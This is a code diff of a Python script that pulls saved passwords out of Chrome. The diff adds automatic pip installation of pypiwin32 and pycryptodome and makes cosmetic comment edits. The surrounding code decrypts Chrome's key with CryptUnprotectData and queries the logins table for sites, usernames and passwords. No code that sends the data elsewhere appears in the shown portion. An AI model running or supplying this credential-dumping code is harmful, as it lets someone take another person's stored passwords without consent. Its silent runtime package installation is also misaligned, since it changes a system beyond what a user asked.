@@ -1,3 +1,16 @@
+import subprocess
+import sys
+
+def install_and_import(package):
+    try:
+        __import__(package)
+    except ImportError:
+        print(f"{package} not found. Installation...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+install_and_import("pypiwin32")  # Alias pour pywin32
+install_and_import("pycryptodome")
+
 import os
 import json
 import base64
@@ -8,8 +21,8 @@ import shutil
 from datetime import timezone, datetime, timedelta
 
 def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
+    """Return a datetime.datetime object from a chrome format datetime
+    Since chromedate is formatted as the number of microseconds since January, 1601"""
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
@@ -26,7 +39,6 @@ def get_encryption_key():
     key = key[5:]
     # return decrypted key that was originally encrypted
     # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 
@@ -60,7 +72,7 @@ def main():
     # connect to the database
     db = sqlite3.connect(filename)
     cursor = db.cursor()
-    # `logins` table has the data we need
+    # logins table has the data we need
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
     # iterate over all rows
     for row in cursor.fetchall():
